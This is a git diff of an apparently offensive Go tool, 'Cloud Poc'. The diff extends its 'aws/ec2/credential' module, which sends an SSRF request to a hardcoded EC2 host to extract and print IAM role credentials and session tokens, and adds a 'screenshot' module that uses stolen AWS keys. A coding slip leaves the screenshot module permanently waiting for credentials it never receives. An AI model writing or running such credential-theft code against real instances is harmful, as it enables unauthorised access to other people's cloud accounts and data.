@@ -18,9 +18,26 @@ type CloudPoc struct {
 	exploit   string
 }
 
+type ec2Token struct {
+	IamRole         string
+	AccessKeyId     string
+	SecretAccessKey string
+	Token           string
+	SsrfUrl         string
+}
+
+type awsCreds struct {
+	Region          string
+	AccessKeyId     string
+	SecretAccessKey string
+}
+
+var ec2GetToken ec2Token
+var awsCredsInfo awsCreds
+
 func NewCloudPoc() *CloudPoc {
 	return &CloudPoc{
-		prompt:    "[Cloud Poc] > ",
+		prompt:    "[Cloud Poc] >> ",
 		targetNum: 1,
 	}
 }
@@ -69,7 +86,6 @@ func (cloud *CloudPoc) handleInput(input string) {
 	cmdArgs := parts[1:]
 
 	cloudType := reflect.TypeOf(cloud)
-
 	method, found := cloudType.MethodByName(cmdName)
 
 	if found {
@@ -85,12 +101,10 @@ func (cloud *CloudPoc) handleInput(input string) {
 	} else {
 		color.Red.Println("Unknown command. Type 'help' for available commands.")
 	}
-
 }
 
 func (cloud *CloudPoc) Help(args []string) {
 	color.White.Println("Available commands:")
-
 	color.White.Println("  help - Show this help message")
 	color.White.Println("  aws - Use aws module")
 	color.White.Println("    list - List available commands in aws module")
@@ -102,19 +116,20 @@ func (cloud *CloudPoc) List(module string) {
 	if module == "" {
 		color.Red.Println("No module selected. Type 'help' for available commands.")
 		return
-	} else {
-		color.Cyan.Println("Module: ", module)
-		color.White.Println("Available commands:")
+	}
 
-		modulePath := "module/" + module
-		subdirectories, err := getSubdirectories(modulePath)
-		if err != nil {
-			color.Red.Println("Module Error:", err)
-			return
-		}
-		for _, dir := range subdirectories {
-			color.White.Println("  ", dir)
-		}
+	color.Cyan.Println("Module: ", module)
+	color.White.Println("Available commands:")
+
+	modulePath := "module/" + module
+	subdirectories, err := getSubdirectories(modulePath)
+	if err != nil {
+		color.Red.Println("Module Error:", err)
+		return
+	}
+
+	for _, dir := range subdirectories {
+		color.White.Println("  ", dir)
 	}
 }
 
@@ -123,18 +138,38 @@ func (cloud *CloudPoc) Use(exploit string) {
 		color.Red.Println("No module specified. Type 'help' for available commands.")
 		return
 	}
-	if exploit == "aws/ec2/credential" {
 
-		cloud.exploit = exploit
-		cloud.prompt = fmt.Sprintf("[Cloud Poc] > [%s] > ", cloud.exploit)
+	switch exploit {
+	case "aws/ec2/credential":
+		printPrompt(cloud, exploit)
 
-		m := ec2.NewEC2Module("http://ec2-54-156-95-23.compute-1.amazonaws.com:12345/index?url=")
-		ec2Credential := m.Exploit()
-		fmt.Println(ec2Credential.IamRole)
-		fmt.Println(ec2Credential.AccessKeyId)
-		fmt.Println(ec2Credential.SecretAccessKey)
-		fmt.Println(ec2Credential.Token)
-	} else {
+		ec2Exploit := ec2.NewEC2Module("http://ec2-54-156-95-23.compute-1.amazonaws.com:12345/index?url=")
+
+		ec2Credential := ec2Exploit.Exploit()
+		ec2GetToken = ec2Token{
+			IamRole:         ec2Credential.IamRole,
+			AccessKeyId:     ec2Credential.AccessKeyId,
+			SecretAccessKey: ec2Credential.SecretAccessKey,
+			Token:           ec2Credential.Token,
+			SsrfUrl:         ec2Credential.SsrfUrl,
+		}
+
+		fmt.Println(ec2GetToken.IamRole)
+		fmt.Println(ec2GetToken.AccessKeyId)
+		fmt.Println(ec2GetToken.SecretAccessKey)
+		fmt.Println(ec2GetToken.Token)
+		break
+	case "aws/ec2/screenshot":
+		printPrompt(cloud, exploit)
+
+		if awsCredsInfo.AccessKeyId == "" && awsCredsInfo.SecretAccessKey == "" {
+			color.Red.Println("Please use the 'aws/ec2/credential' module first.")
+			return
+		}
+
+		ec2.Screenshot(awsCredsInfo.AccessKeyId, awsCredsInfo.SecretAccessKey)
+
+	default:
 		color.Red.Println("Unknown module. Type 'help' for available commands.")
 		return
 	}
@@ -142,7 +177,7 @@ func (cloud *CloudPoc) Use(exploit string) {
 
 func (cloud *CloudPoc) cmdLoop() {
 	cloud.asciiArt()
-	color.Cyan.Println("Welcome to Cloud Poc, which provide cloud POC. Type \"help\" to see the list of available commands.\n")
+	color.Cyan.Println("Welcome to Cloud Poc, which provides cloud POC. Type \"help\" to see the list of available commands.\n")
 
 	scanner := bufio.NewScanner(os.Stdin)
 	for {
@@ -155,6 +190,11 @@ func (cloud *CloudPoc) cmdLoop() {
 		}
 		cloud.handleInput(input)
 	}
+}
+
+func printPrompt(cloud *CloudPoc, exploit string) {
+	cloud.exploit = exploit
+	cloud.prompt = fmt.Sprintf("[Cloud Poc] >> [%s] >> ", cloud.exploit)
 }
 
 func main() {
